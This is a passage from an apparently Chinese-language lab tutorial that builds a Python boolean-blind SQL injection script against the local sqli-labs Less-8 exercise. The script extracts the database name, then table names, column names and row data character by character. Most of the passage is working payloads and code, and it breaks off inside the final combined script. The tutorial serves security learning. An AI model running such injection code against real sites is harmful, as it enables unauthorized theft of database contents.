class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(username) from users)=13 --+</span></span><br></pre></td></tr></table></figure><p>获取数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(username) from users limit 0,1)=4 --+</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=68 --+</span></span><br></pre></td></tr></table></figure><h2 id="开始写脚本"><a href="#开始写脚本" class="headerlink" title="开始写脚本"></a>开始写脚本</h2><h4 id="头部："><a href="#头部：" class="headerlink" title="头部："></a>头部：</h4><p>首先实现对知道网页发送请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure><p>可以对url参数中的url发起请求</p><p>我们使用<code>normalHtmlLen</code>来存放响应长度，通过比较响应长度来判断页面回显的真假</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br></pre></td></tr></table></figure><h4 id="第一部分：猜解库名"><a href="#第一部分：猜解库名" class="headerlink" title="第一部分：猜解库名"></a>第一部分：猜解库名</h4><ol><li><p>首先判断库名的长度</p><p>通过一次循环来判断，输出库名长度</p></li><li><p>接着猜解库名</p><p>这里用两层循环，分别控制<code>substr</code>截取的地方和判断相等的地方</p><p><code>for a in range(33,127):</code>这里用ascii码来判断</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload,方便测试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br></pre></td></tr></table></figure><h4 id="第二部分：猜解表名"><a href="#第二部分：猜解表名" class="headerlink" title="第二部分：猜解表名"></a>第二部分：猜解表名</h4><ol><li>判断表的个数</li><li>判断每个表的长度</li><li>猜解每个表</li></ol><p>这部分和猜解库名时的不同是：表的个数有多个，所以我们需要分别将每个表的长度判断出来再猜解表名</p><p>这就需要一个稍复杂的循环，这是脚本中最复杂的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br></pre></td></tr></table></figure><h4 id="第三部分：猜解列名"><a href="#第三部分：猜解列名" class="headerlink" title="第三部分：猜解列名"></a>第三部分：猜解列名</h4><p>本部分的思路与猜解表名是相同，就不多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第四部分：拿数据"><a href="#第四部分：拿数据" class="headerlink" title="第四部分：拿数据"></a>第四部分：拿数据</h4><p>思路和猜解表名库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><h3 id="最终脚本"><a href="#最终脚本" class="headerlink" title="最终脚本"></a>最终脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> 